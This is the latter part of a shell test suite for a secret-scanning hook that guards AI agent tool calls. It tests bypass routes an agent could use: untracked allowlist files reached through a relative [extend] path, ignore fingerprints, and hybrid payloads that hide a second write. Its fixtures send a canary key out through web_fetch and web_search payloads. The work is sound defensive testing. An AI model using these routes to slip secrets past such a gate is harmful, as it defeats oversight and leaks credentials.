      || fail "(t844l/$SH844) the location must name the renamed file .gitleaksignore.T844"
    rm -rf "$R"
    ok "(t844l/$SH844) .gitleaksignore: fingerprint ignored (diff, --content), said; its CONTENT still scanned"
  done

  # --- (t844m) `[extend] path` RELATIF dans le .gitleaks.toml du pilote : gitleaks
  # le résolvait contre son cwd, l'ÉTAGE — qu'un `extra.toml` NON SUIVI de l'agent
  # peuple. Mesuré avant correctif : rc 0, le secret passait. CINQ graphies que
  # gitleaks 8.30.1 accepte toutes (une lecture syntaxique en ratait quatre —
  # re-revue) : table nue, table espacée, table en ligne, clé pointée, clé en
  # capitales. Le correctif est STRUCTUREL (gitleaks tourne depuis un répertoire
  # VIDE), donc aucune graphie ne se résout plus contre le diff => rc 2 + annonce.
  for SH844 in $T844_SHELLS; do
    for forme in table espacee enligne pointee capitales; do
      case "$forme" in
        table)     CFGTXT="$(printf '[extend]\npath = "extra.toml"')" ;;
        espacee)   CFGTXT="$(printf '[ extend ]\npath = "extra.toml"')" ;;
        enligne)   CFGTXT='extend = { path = "extra.toml" }' ;;
        pointee)   CFGTXT='extend.path = "extra.toml"' ;;
        capitales) CFGTXT="$(printf '[extend]\nPATH = "extra.toml"')" ;;
      esac
      R="$(mk_repo_cfg "$CFGTXT")"
      printf '[extend]\nuseDefault = true\n[allowlist]\nregexes = [\n  %s,\n]\n' "'''$T844_TOK'''" > "$R/extra.toml"
      printf 'aws_key = "%s"\n' "$T844_TOK" > "$R/secret.txt"
      OUT="$( cd "$R" && "$SH844" "$SCRIPT" 2>&1 )"; rc=$?
      [ "$rc" -eq 2 ] || fail "(t844m/$SH844/$forme) a RELATIVE [extend] path must not let an agent file exempt a secret (rc 2), got $rc — $OUT"
      printf '%s' "$OUT" | grep -Eq "unreadable|set aside" \
        || fail "(t844m/$SH844/$forme) the set-aside config must be announced, got: $OUT"
      rm -rf "$R"
    done
    ok "(t844m/$SH844) relative [extend] path, 5 spellings + agent extra.toml: set aside, secret BLOCKED"
  done
  # Contrôles : un `path` ABSOLU est gardé (borne écrite au README) ; le `path`
  # d'une RÈGLE (une regex) n'est pas une extension et ne déclenche rien.
  D="$(mktemp -d)"; assert_tmpdir "$D"
  printf '[extend]\nuseDefault = true\n[allowlist]\nregexes = [\n  %s,\n]\n' "'''$T844_TOK'''" > "$D/abs.toml"
  R="$(mk_repo_cfg "$(printf '[extend]\npath = "%s"' "$D/abs.toml")")"
  printf 'aws_key = "%s"\n' "$T844_TOK" > "$R/secret.txt"
  OUT="$( cd "$R" && bash "$SCRIPT" 2>&1 )"; rc=$?
  [ "$rc" -eq 0 ] || fail "(t844m) an ABSOLUTE [extend] path is kept (its allowlist applies, rc 0), got $rc — $OUT"
  printf '%s' "$OUT" | grep -q "RELATIVE" && fail "(t844m) an absolute path must not be called relative, got: $OUT"
  rm -rf "$R"
  R="$(mk_repo_cfg "$(printf '[extend]\nuseDefault = true\n\n[[rules]]\nid = "x-rule"\nregex = %s\npath = %s' "'''zzqqzzqq[0-9]{8}'''" "'''docs/.*'''")")"
  printf 'x = 1\n' > "$R/dirty.txt"
  OUT="$( cd "$R" && bash "$SCRIPT" 2>&1 )"; rc=$?
  [ "$rc" -eq 0 ] || fail "(t844m) a rule's path regex must not set the config aside (rc 0), got $rc — $OUT"
  printf '%s' "$OUT" | grep -q "RELATIVE" && fail "(t844m) a rule's path is not an [extend] path, got: $OUT"
  rm -rf "$R" "$D"
  ok "(t844m) controls: absolute [extend] path kept; a rule's path is not an extension"

  # --- (t844n) LE PRIX DU RÉPERTOIRE VIDE : gitleaks voit `../<étage>/a/b/k.txt`.
  # Les DEUX compteurs (python, et la boucle sans python) doivent rendre la
  # location RELATIVE au dépôt, `a/b/k.txt:1` — jamais le préfixe de l'étage.
  T4NP="$(mktemp -d)"; assert_tmpdir "$T4NP"
  for p in python3 python; do
    { printf '#!/bin/sh\n'; printf 'exit 127\n'; } > "$T4NP/$p"; chmod +x "$T4NP/$p"
  done
  for arm in py nopy; do
    if [ "$arm" = py ]; then P="$PATH"; else P="$T4NP:$PATH"; fi
    R="$(mk_repo)"; mkdir -p "$R/a/b"
    printf 'aws_key = "%s"\n' "$T844_TOK" > "$R/a/b/k.txt"
    OUT="$( cd "$R" && PATH="$P" bash "$SCRIPT" 2>&1 )"; rc=$?
    [ "$rc" -eq 2 ] || fail "(t844n/$arm) secret must BLOCK, got $rc — $OUT"
    tail -1 "$R/.agents/state/local/sca-reports/audit-log.jsonl" | grep -q '"locations":\["a/b/k.txt:1"\]' \
      || fail "(t844n/$arm) the audit location must be repo-relative 'a/b/k.txt:1', got: $(tail -1 "$R/.agents/state/local/sca-reports/audit-log.jsonl")"
    rm -rf "$R"
  done
  rm -rf "$T4NP"
  ok "(t844n) locations stay repo-relative on both counters (python and no-python)"
  # Non-vacuité : l'empreinte écrite ci-dessus EXEMPTE bien sous gitleaks nu —
  # sinon (t844l) passerait sur une empreinte fausse.
  D="$(mktemp -d)"; assert_tmpdir "$D"
  printf 'aws_key = "%s"\n' "$T844_TOK" > "$D/secret.txt"
  printf 'secret.txt:aws-access-token:1\n' > "$D/.gitleaksignore"
  ( cd "$D" && gitleaks detect --no-git --source . --no-banner --redact ) >/dev/null 2>&1; rc=$?
  [ "$rc" -eq 0 ] || fail "(t844l) witness: bare gitleaks must honour this fingerprint (rc 0), got $rc — the arm measures nothing"
  printf 'aws_key = "%s" // gitleaks:allow\n' "$T844_TOK" > "$D/secret.txt"; rm -f "$D/.gitleaksignore"
  ( cd "$D" && gitleaks detect --no-git --source . --no-banner --redact ) >/dev/null 2>&1; rc=$?
  [ "$rc" -eq 0 ] || fail "(t844k) witness: bare gitleaks must honour gitleaks:allow (rc 0), got $rc — the arm measures nothing"
  rm -rf "$D"
  ok "(t844k/l) witnesses: gitleaks:allow and the fingerprint DO exempt under bare gitleaks"
else
  echo "  SKIP (t844a-f): gitleaks not installed — (t844g)/(t844h) still prove the systemMessage channel"
fi

# --- (t844g) TOUJOURS : un DEGRADED terminal du mode diff (stub gitleaks rc 1
# sans rapport) rend UN systemMessage JSON valide sur stdout, exit 0 — avec
# python (json.dumps) et SANS python (échappement à la main, stubs 127).
T4STUB="$(mktemp -d)"; assert_tmpdir "$T4STUB"
{ printf '#!/usr/bin/env bash\n'; printf 'exit 1\n'; } > "$T4STUB/gitleaks"
chmod +x "$T4STUB/gitleaks"
T4NOPY="$(mktemp -d)"; assert_tmpdir "$T4NOPY"
for p in python3 python; do
  { printf '#!/bin/sh\n'; printf 'exit 127\n'; } > "$T4NOPY/$p"; chmod +x "$T4NOPY/$p"
done
for SH844 in $T844_SHELLS; do
  for arm in py nopy; do
    if [ "$arm" = py ]; then P="$T4STUB:$NOGL_PATH"; else P="$T4NOPY:$T4STUB:$NOGL_PATH"; fi
    R="$(mk_repo)"; printf 'x = "a \\ quote \" here"\n' > "$R/dirty.txt"
    OUT="$( cd "$R" && PATH="$P" "$SH844" "$SCRIPT" 2>/dev/null )"; rc=$?
    [ "$rc" -eq 0 ] || fail "(t844g/$SH844/$arm) DEGRADED must exit 0, got $rc"
    t844_json_ok "$OUT" "no finding could be read" \
      || fail "(t844g/$SH844/$arm) stdout must be ONE valid systemMessage JSON, got: [$OUT]"
    rm -rf "$R"
    ok "(t844g/$SH844/$arm) DEGRADED in diff mode: exit 0 + ONE valid systemMessage JSON on stdout"
  done
done
# --- (t844h) --content reste MUET sur stdout en DEGRADED (PreToolUse,
# mcp_render.py lit stderr) : le canal neuf est celui du Stop seulement.
OUT="$( printf 'x\n' | PATH="$T4STUB:$NOGL_PATH" bash "$SCRIPT" --content 2>/dev/null )"; rc=$?
[ "$rc" -eq 0 ] || fail "(t844h) --content DEGRADED must exit 0, got $rc"
[ -z "$OUT" ] || fail "(t844h) --content must keep stdout empty on DEGRADED, got: [$OUT]"
rm -rf "$T4STUB" "$T4NOPY"
ok "(t844h) --content DEGRADED: stdout stays empty (stderr contract unchanged)"

# --- (t844j) TOUJOURS : LE COÛT. Stub compteur, dépôt AVEC .gitleaks.toml.
# Scan réussi (rc 0, rapport `[]`) => UN SEUL lancement : la config valide ne
# paie aucune vérification (la version « vérifier AVANT » en faisait 2).
# Scan en échec sans rapport (rc 1) => TROIS : scan, vérification, re-scan —
# et le re-scan en échec lui aussi reste DEGRADED (audit), jamais « clean ».
# `half` : la config SE CHARGE (rc 0 sur le répertoire vide de la vérification)
# mais le scan échoue sans rapport => DEUX lancements, config GARDÉE (pas
# d'« IGNORED »), verdict DEGRADED. Rougit si la vérification est court-circuitée
# (`if true`) ou si le rc du scan est écrasé (`rc=0`).
T4CNT="$(mktemp -d)"; assert_tmpdir "$T4CNT"
for mode844 in ok ko half; do
  : > "$T4CNT/calls"
  { printf '#!/usr/bin/env bash\n'
    printf 'echo x >> "%s/calls"\n' "$T4CNT"
    if [ "$mode844" = ok ]; then
      printf 'rp=""; prev=""\n'
      printf 'for a in "$@"; do [ "$prev" = "--report-path" ] && rp="$a"; prev="$a"; done\n'
      printf '[ -n "$rp" ] && printf %%s %s > "$rp"\n' "'[]'"
      printf 'exit 0\n'
    elif [ "$mode844" = half ]; then
      # juge la SOURCE (vide à la vérification, l'étage au scan) — plus le cwd,
      # vide dans les deux cas depuis que gitleaks tourne d'un répertoire vide.
      printf 'src=""; prev=""\n'
      printf 'for a in "$@"; do [ "$prev" = "--source" ] && src="$a"; prev="$a"; done\n'
      printf '[ -z "$(ls -A "$src")" ] && exit 0\n'
      printf 'exit 1\n'
    else
      printf 'exit 1\n'
    fi; } > "$T4CNT/gitleaks"
  chmod +x "$T4CNT/gitleaks"
  R="$(mk_repo_cfg "$T844_GOOD")"; printf 'x = 1\n' > "$R/dirty.txt"
  OUT="$( cd "$R" && PATH="$T4CNT:$NOGL_PATH" bash "$SCRIPT" 2>&1 )"; rc=$?
  calls="$(wc -l < "$T4CNT/calls" | tr -d ' ')"
  AUD="$(tail -1 "$R/.agents/state/local/sca-reports/audit-log.jsonl" 2>/dev/null)"
  if [ "$mode844" = ok ]; then
    [ "$calls" -eq 1 ] || fail "(t844j/ok) a valid config must cost ONE gitleaks spawn, got $calls"
    printf '%s' "$OUT" | grep -q "COVERAGE DEGRADED" && fail "(t844j/ok) no DEGRADED expected, got: $OUT"
  elif [ "$mode844" = ko ]; then
    [ "$calls" -eq 3 ] || fail "(t844j/ko) a failed scan must cost scan + check + rescan = 3 spawns, got $calls"
    printf '%s' "$OUT" | grep -q "allowlist IGNORED" || fail "(t844j/ko) the set-aside config must be announced, got: $OUT"
  else
    [ "$calls" -eq 2 ] || fail "(t844j/half) a loadable config after a failed scan must cost scan + check = 2 spawns, got $calls"
    printf '%s' "$OUT" | grep -q "allowlist IGNORED" && fail "(t844j/half) a LOADABLE config must NOT be set aside, got: $OUT"
  fi
  if [ "$mode844" != ok ]; then
    printf '%s' "$AUD" | grep -q '"verdict":"DEGRADED"' \
      || fail "(t844j/$mode844) a scan that fails without report must audit DEGRADED, got: $AUD"
    printf '%s' "$OUT" | grep -q "no finding could be read" \
      || fail "(t844j/$mode844) the no-report DEGRADED must be said, got: $OUT"
  fi
  [ "$rc" -eq 0 ] || fail "(t844j/$mode844) must exit 0, got $rc"
  rm -rf "$R"
done
rm -rf "$T4CNT"
ok "(t844j) cost: valid config = 1 spawn; failed scan + broken config = 3 (DEGRADED); failed scan + loadable config = 2 (DEGRADED, config kept)"

# --- (t844i) TEXTUEL : le README dit le prix et le canal, pas seulement la règle
grep -q "allowlist IGNORED" "$README_F" || fail "(t844i) README must quote the 'allowlist IGNORED' announcement"
grep -q "BLOCKS again until the pilot" "$README_F" || fail "(t844i) README must say false positives block again until repaired"
grep -q '"systemMessage"' "$README_F" || fail "(t844i) README must document the Stop systemMessage"
grep -q "PILOT's file" "$README_F" || fail "(t844i) README must say .gitleaks.toml is pilot-only"
grep -q "a config that LOADS can still switch gitleaks off" "$README_F" \
  || fail "(t844i) README must bound the check: a loadable config without useDefault silences gitleaks"
grep -q "two channels, two verdicts" "$README_F" \
  || fail "(t844i) README must name the audit CLEAN / stderr DEGRADED split"
grep -q "ONLY exception channel" "$README_F" \
  || fail "(t844i) README must say gitleaks:allow and .gitleaksignore are ignored"
grep -q "NARROWER if the file added custom" "$README_F" \
  || fail "(t844i) README must say the default-rule rescan drops custom [[rules]]"
grep -q "prevents forgetting, not cheating" "$README_F" \
  || fail "(t844i) README must bound the redirect guard (T-00000720)"
grep -q "its CONTENT is still scanned" "$README_F" \
  || fail "(t844i) README must say the renamed .gitleaksignore is still scanned"
grep -q "MUST be absolute" "$README_F" \
  || fail "(t844i) README must say an [extend] path must be absolute"
grep -q "never resolves against the scanned stage" "$README_F" \
  || fail "(t844i) README must describe the empty-directory fix"
grep -q 'the gate does NOT enforce the' "$README_F" \
  || fail "(t844i) README must bound the fix: ../x reaches \$TMPDIR, rule held by the pilot"
grep -q "<x>.gitleaks.toml" "$README_F" \
  || fail "(t844i) README must say how to protect an in-repo extension file"
grep -q "two engines, two verdicts" "$README_F" \
  || fail "(t844i) README must name the fallback/gitleaks split on a broken config"
grep -q "rule-less .GITLEAKS_CONFIG_TOML." "$README_F" \
  || fail "(t844i) README must bound a rule-less GITLEAKS_CONFIG_TOML"
ok "(t844i) README documents the set-aside config, its price, the systemMessage and the pilot-only register"

# ==== T-01M4RWC6VHHN479J2A9RRY1BE3 : SORTIE PRÉCOCE SOUS COPILOT (lecture locale) ====
# (v) UN OBSERVABLE NOMMÉ (C3 du plan). Le script tourne depuis un `mktemp -d`
# hors dépôt (ROOT = ce répertoire), TMPDIR à côté, la charge sur stdin, et des
# bouchons `git` et `gitleaks` en tête de PATH qui consignent leur appel puis
# exécutent le vrai binaire. Un bouchon n'est écrit que pour un chemin ABSOLU :
# `grep` est une fonction de shell sur certains hôtes, et un bouchon qui s'y
# rappelle lui-même boucle (mesuré : 17 123 appels avant blocage). Mesuré à la
# base, charge `view` : bouchon git x1, gitleaks x1, et
# ./.agents/state/local/sca-reports/audit-log.jsonl écrit. Attendu : un nom LISTÉ
# sort avant tout git, mktemp ou mkdir. Les témoins de discrimination (un exclu,
# bash, un nom vide, les formes groupée et hybride, des graphies en désaccord,
# `view` sous codex) gardent les observables de la base : ils tuent les mutants
# « toujours vrai », « aveugle au nom », « aveugle à l'hôte » et « aveugle au
# second outil ».
lc_run() {  # $1 hôte, $2 charge, puis le script et ses arguments -> LC_RC LC_GIT LC_GL LC_AGENTS
  local hote="$1" charge="$2" p n reel
  shift 2
  p="$(mktemp -d)"
  mkdir -p "$p/w" "$p/bouchons" "$p/tmp" "$p/ev"
  : > "$p/trace"
  for n in git gitleaks; do
    reel="$(command -v "$n" 2>/dev/null)" || continue
    case "$reel" in
      /*) ;;
      *) continue ;;
    esac
    {
      printf '#!/bin/sh\n'
      printf 'printf "%%s\\n" "%s" >> "%s"\n' "$n" "$p/trace"
      printf 'exec "%s" "$@"\n' "$reel"
    } > "$p/bouchons/$n"
    chmod +x "$p/bouchons/$n"
  done
  ( cd "$p/w" && printf '%s' "$charge" \
      | env PATH="$p/bouchons:$PATH" TMPDIR="$p/tmp" AGENTS_EVENTS_DIR="$p/ev" AGENTS_HOOK_HOST="$hote" bash "$@" ) >/dev/null 2>&1
  LC_RC=$?
  LC_GIT="$(grep -c '^git$' "$p/trace" || true)"
  LC_GL="$(grep -c '^gitleaks$' "$p/trace" || true)"
  LC_AGENTS=0
  [ -e "$p/w/.agents" ] && LC_AGENTS=1
  rm -rf "$p"
}
LC_VUE='{"toolName":"view","toolArgs":{"path":"src/a.py"}}'
lc_run copilot "$LC_VUE" "$SCRIPT" --content
[ "$LC_GIT" -eq 0 ] || fail "(v1) copilot + view (listé) : bouchon git appelé $LC_GIT fois, attendu 0 (base : 1)"
[ "$LC_GL" -eq 0 ] || fail "(v1) copilot + view (listé) : bouchon gitleaks appelé $LC_GL fois, attendu 0 (base : 1)"
[ "$LC_AGENTS" -eq 0 ] || fail "(v1) copilot + view (listé) : ./.agents créé (audit-log.jsonl), attendu aucun artefact"
[ "$LC_RC" -eq 0 ] || fail "(v1) copilot + view (listé) : rc $LC_RC, attendu 0"
ok "(v1) copilot + view (listé) : sortie avant tout git/mktemp/mkdir — 0 git, 0 gitleaks, aucun ./.agents"
lc_discrimine() {  # $1 étiquette, puis les arguments de lc_run
  local etiquette="$1"
  shift
  lc_run "$@"
  [ "$LC_GIT" -ge 1 ] || fail "(v2) $etiquette : bouchon git jamais appelé — un nom non listé garde le chemin de la base"
  [ "$LC_AGENTS" -eq 1 ] || fail "(v2) $etiquette : aucun ./.agents écrit — un nom non listé garde le chemin de la base"
  if [ "$HAVE_GITLEAKS" -eq 1 ]; then
    [ "$LC_GL" -ge 1 ] || fail "(v2) $etiquette : bouchon gitleaks jamais appelé — la charge n'a pas été scannée"
  fi
}
lc_discrimine "exclu web_fetch" copilot '{"toolName":"web_fetch","toolArgs":{"url":"https://x.invalid/"}}' "$SCRIPT" --content
lc_discrimine "bash" copilot '{"toolName":"bash","toolArgs":{"command":"ls"}}' "$SCRIPT" --content
lc_discrimine "nom vide" copilot '{"toolName":"","toolArgs":{"path":"a"}}' "$SCRIPT" --content
lc_discrimine "forme groupée" copilot '{"toolCalls":[{"toolName":"view","toolArgs":{"path":"a"}}]}' "$SCRIPT" --content
lc_discrimine "forme hybride toolCalls" copilot '{"toolName":"view","toolArgs":{"path":"a"},"toolCalls":[{"name":"create","args":{"file_text":"x"}}]}' "$SCRIPT" --content
lc_discrimine "forme hybride tool_calls" copilot '{"toolName":"view","tool_calls":[{"name":"create","args":{"file_text":"x"}}]}' "$SCRIPT" --content
lc_discrimine "graphies en désaccord" copilot '{"toolName":"view","tool_name":"create","tool_input":{"file_text":"x"}}' "$SCRIPT" --content
lc_discrimine "view sous codex" codex "$LC_VUE" "$SCRIPT" --content
ok "(v2) exclu, bash, nom vide, formes groupée et hybride, graphies en désaccord et view sous codex gardent les observables de la base (git appelé, ./.agents écrit)"

# (vi) CLASSE 0, RÉTENTION (C1 du plan). Les six noms de EXCLUS_DE_LA_LISTE
# (.agents/evals/test_copilot_early_exit.py) portent le canari concaténé à
# l'exécution (${akia}${body}, jamais contigu dans ce fichier, L-00000391) :
# sous copilot, --content rend rc 2 AVANT et APRÈS la tâche (mesuré à la base :
# 6 sur 6). Bras de RÉTENTION, vert des deux côtés : son témoin est son MUTANT,
# une copie jetable du script dont le bloc de sortie précoce reçoit `web_fetch`,
# fabriquée par python ; le remplacement doit s'appliquer EXACTEMENT une fois,
# sinon le bras échoue (un mutant qui ne mute rien est un témoin muet) ; sur ce
# mutant, web_fetch + canari doit passer (rc 0) — la preuve que le bras rougit.
LC_PY=""
for lc_c in python3 python; do
  "$lc_c" -c 'import sys; sys.exit(sys.version_info[0] != 3)' >/dev/null 2>&1 && { LC_PY="$lc_c"; break; }
done
[ -n "$LC_PY" ] || fail "(vi) python 3 introuvable pour fabriquer le mutant"
lc_canari="${akia}${body}"
lc_charge_exclue() {  # $1 nom exclu -> la charge, canari dans l'argument qui sort du poste
  case "$1" in
    web_fetch) printf '{"toolName":"web_fetch","toolArgs":{"url":"https://x.invalid/?k=%s"}}' "$lc_canari" ;;
    web_search) printf '{"toolName":"web_search","toolArgs":{"query":"cle %s"}}' "$lc_canari" ;;
    fetch_webpage) printf '{"toolName":"fetch_webpage","toolArgs":{"urls":["https://x.invalid/?k=%s"]}}' "$lc_canari" ;;
    semantic_search) printf '{"toolName":"semantic_search","toolArgs":{"query":"%s"}}' "$lc_canari" ;;
    tool_search_tool) printf '{"toolName":"tool_search_tool","toolArgs":{"query":"%s"}}' "$lc_canari" ;;
    ask_user) printf '{"toolName":"ask_user","toolArgs":{"question":"%s ?","choices":["oui"]}}' "$lc_canari" ;;
  esac
}
lc_rc_content() {  # $1 script, $2 charge -> rc de --content sous copilot, depuis un mktemp -d
  local w rc
  w="$(mktemp -d)"
  ( cd "$w" && printf '%s' "$2" | AGENTS_HOOK_HOST=copilot AGENTS_EVENTS_DIR="$w/ev" bash "$1" --content ) >/dev/null 2>&1
  rc=$?
  rm -rf "$w"
  return "$rc"
}
for lc_nom in web_fetch web_search fetch_webpage semantic_search tool_search_tool ask_user; do
  lc_rc_content "$SCRIPT" "$(lc_charge_exclue "$lc_nom")"
  lc_rc=$?
  [ "$lc_rc" -eq 2 ] || fail "(vi) copilot + $lc_nom + canari : rc $lc_rc, attendu 2 (classe 0 — un nom exclu ne sort JAMAIS en avance)"
done
lc_rc_content "$SCRIPT" '{"toolName":"view","toolArgs":{"path":"src/a.py"}}'
lc_rc=$?
[ "$lc_rc" -eq 0 ] || fail "(vi) copilot + view propre : rc $lc_rc, attendu 0"
ok "(vi) rétention classe 0 : les 6 noms exclus + canari rendent rc 2 sous copilot ; view propre rc 0"
lc_mut="$(mktemp -d)"
"$LC_PY" -c '
import sys
source, cible = sys.argv[1], sys.argv[2]
with open(source, encoding="utf-8") as f:
    texte = f.read()
ancre = "OUTILS_LECTURE_COPILOT = (\n"
if texte.count(ancre) != 1:
    sys.exit(3)
with open(cible, "w", encoding="utf-8") as f:
    f.write(texte.replace(ancre, ancre + "    \"web_fetch\",\n", 1))
' "$SCRIPT" "$lc_mut/gitleaks-scan.sh"
lc_rc=$?
[ "$lc_rc" -eq 0 ] || fail "(vi) mutant : l'ancre du bloc n'apparaît pas EXACTEMENT une fois (rc $lc_rc) — un mutant qui ne mute rien est un témoin muet"
lc_rc_content "$lc_mut/gitleaks-scan.sh" "$(lc_charge_exclue web_fetch)"
lc_rc=$?
rm -rf "$lc_mut"
[ "$lc_rc" -eq 0 ] || fail "(vi) mutant (web_fetch ajouté au bloc) : rc $lc_rc, attendu 0 — sans cela le bras de rétention ne pourrait pas rougir"
ok "(vi) témoin du bras : sur le mutant qui liste web_fetch, le canari passe (rc 0) — le bras rougirait"

# (vii) F2 DE LA REVUE DE CLÔTURE (classe 0). Une charge HYBRIDE — nom listé au
# premier niveau ET forme groupée `toolCalls`/`tool_calls` à côté — ou deux
# graphies du nom en désaccord portent un SECOND outil : le canari qu'il porte
# (concaténé à l'exécution, L-00000391) doit rendre rc 2 sous copilot. Mesuré :
# base 111393b6 rc 2, 7baa0156 rc 0 (la sortie précoce ne lisait que le nom de
# premier niveau). Témoins : deux MUTANTS jetables hors dépôt, fabriqués par
# python, remplacement EXACTEMENT une fois — garde `toolCalls` retirée, puis
# exigence de concordance des graphies retirée ; sur chacun, la charge
# correspondante passe (rc 0) : la preuve que le bras rougirait.
lc_hyb_tc="$(printf '{"toolName":"view","toolArgs":{"path":"a.py"},"toolCalls":[{"name":"create","args":{"path":"cfg.py","file_text":"aws_access_key_id = %s"}}]}' "$lc_canari")"
lc_hyb_sc="$(printf '{"toolName":"view","toolArgs":{"path":"a.py"},"tool_calls":[{"name":"create","args":{"path":"cfg.py","file_text":"aws_access_key_id = %s"}}]}' "$lc_canari")"
lc_graph="$(printf '{"toolName":"view","tool_name":"create","tool_input":{"path":"cfg.py","file_text":"aws_access_key_id = %s"}}' "$lc_canari")"
for lc_cas in toolCalls tool_calls graphies; do
  case "$lc_cas" in
    toolCalls) lc_ch="$lc_hyb_tc" ;;
    tool_calls) lc_ch="$lc_hyb_sc" ;;
    graphies) lc_ch="$lc_graph" ;;
  esac
  lc_rc_content "$SCRIPT" "$lc_ch"
  lc_rc=$?
  [ "$lc_rc" -eq 2 ] || fail "(vii) copilot + view + $lc_cas + canari : rc $lc_rc, attendu 2 (classe 0 — un second outil à côté d'un nom listé est JUGÉ)"
done
ok "(vii) F2 : formes hybrides toolCalls et tool_calls, graphies en désaccord + canari rendent rc 2 sous copilot"
lc_hyb_mutant() {  # $1 ancre retirée du bloc, $2 charge -> LC_HYB_FAB (fabrication) LC_HYB_RC (rc du mutant)
  local d
  d="$(mktemp -d)"
  "$LC_PY" -c '
import sys
source, cible, ancre = sys.argv[1], sys.argv[2], sys.argv[3]
with open(source, encoding="utf-8") as f:
    texte = f.read()
if texte.count(ancre) != 1:
    sys.exit(3)
with open(cible, "w", encoding="utf-8") as f:
    f.write(texte.replace(ancre, "", 1))
' "$SCRIPT" "$d/gitleaks-scan.sh" "$1"
  LC_HYB_FAB=$?
  lc_rc_content "$d/gitleaks-scan.sh" "$2"
  LC_HYB_RC=$?
  rm -rf "$d"
}
lc_hyb_mutant ' and "toolCalls" not in p and "tool_calls" not in p' "$lc_hyb_tc"
[ "$LC_HYB_FAB" -eq 0 ] || fail "(vii) mutant : la garde toolCalls n'apparaît pas EXACTEMENT une fois (rc $LC_HYB_FAB) — un mutant qui ne mute rien est un témoin muet"
[ "$LC_HYB_RC" -eq 0 ] || fail "(vii) mutant (garde toolCalls retirée) : rc $LC_HYB_RC, attendu 0 — sans cela le bras hybride ne pourrait pas rougir"
lc_hyb_mutant 'len(set(noms)) == 1 and ' "$lc_graph"
[ "$LC_HYB_FAB" -eq 0 ] || fail "(vii) mutant : la concordance des graphies n'apparaît pas EXACTEMENT une fois (rc $LC_HYB_FAB) — un mutant qui ne mute rien est un témoin muet"
[ "$LC_HYB_RC" -eq 0 ] || fail "(vii) mutant (concordance des graphies retirée) : rc $LC_HYB_RC, attendu 0 — sans cela le bras graphies ne pourrait pas rougir"
ok "(vii) témoins du bras : sans la garde toolCalls, ou sans la concordance des graphies, le canari passe (rc 0) — le bras rougirait"

# (a4) A4 de T-01M4RWC0DBM6XC1PDQGEG4P79C (décision pilote
# S-01M4RWM3TC4JWE5FDC8YB819Z4) : gitleaks-scan.sh n'est PAS aligné sur
# l'enveloppe à rc 0 des hooks natifs. Sous AGENTS_HOOK_HOST=copilot, --content
# sur une ÉCRITURE portant le canari rend rc 2, et stdout ne porte aucune
# permissionDecision : le canal du refus est le code de sortie. Bras de
# RÉTENTION (vert avant et après la tâche) ; son témoin est le MUTANT qui
# « aligne » copilot sur rc 0 devant l'unique `exit 2` du script : sur lui, le
# même stimulus doit passer (rc 0) — la preuve que le bras rougirait. Aucun
# alignement ne peut donc passer en rc 0 sans une décision qui retouche ce bras.
lc_a4_charge="$(printf '{"toolName":"create","toolArgs":{"path":"cfg.py","file_text":"aws_access_key_id = %s"}}' "$lc_canari")"
lc_a4() {  # $1 script -> LC_A4_RC (rc de --content sous copilot) et LC_A4_OUT (stdout)
  local w
  w="$(mktemp -d)"
  LC_A4_OUT="$( cd "$w" && printf '%s' "$lc_a4_charge" | AGENTS_HOOK_HOST=copilot AGENTS_EVENTS_DIR="$w/ev" bash "$1" --content 2>/dev/null )"
  LC_A4_RC=$?
  rm -rf "$w"
}
lc_a4 "$SCRIPT"
[ "$LC_A4_RC" -eq 2 ] || fail "(a4) copilot + create + canari en --content : rc $LC_A4_RC, attendu 2 (A4 : gitleaks garde exit 2, jamais l'enveloppe à rc 0)"
case "$LC_A4_OUT" in
  *permissionDecision*) fail "(a4) copilot --content ne doit JAMAIS émettre de permissionDecision (le canal est rc 2), stdout : $LC_A4_OUT" ;;
esac
ok "(a4) A4 : sous copilot, --content + canari sur une écriture rend rc 2, sans enveloppe sur stdout"
lc_mut="$(mktemp -d)"
"$LC_PY" -c '
import sys
source, cible = sys.argv[1], sys.argv[2]
with open(source, encoding="utf-8") as f:
    texte = f.read()
ancre = "\n  exit 2\nfi\n"
if texte.count(ancre) != 1:
    sys.exit(3)
mute = "\n  if [ \"$AGENTS_HOOK_HOST\" = copilot ]; then exit 0; fi" + ancre
with open(cible, "w", encoding="utf-8") as f:
    f.write(texte.replace(ancre, mute, 1))
' "$SCRIPT" "$lc_mut/gitleaks-scan.sh"
lc_rc=$?
[ "$lc_rc" -eq 0 ] || fail "(a4) mutant : l'unique exit 2 du script n'apparaît pas EXACTEMENT une fois (rc $lc_rc) — un mutant qui ne mute rien est un témoin muet"
lc_a4 "$lc_mut/gitleaks-scan.sh"
rm -rf "$lc_mut"
[ "$LC_A4_RC" -eq 0 ] || fail "(a4) mutant (copilot aligné sur rc 0) : rc $LC_A4_RC, attendu 0 — sans cela le bras A4 ne pourrait pas rougir"
ok "(a4) témoin du bras : sur le mutant qui aligne copilot sur rc 0, le canari passe — le bras rougirait"

echo "PASS: gitleaks-scan ($pass check(s); gitleaks present=$HAVE_GITLEAKS)"
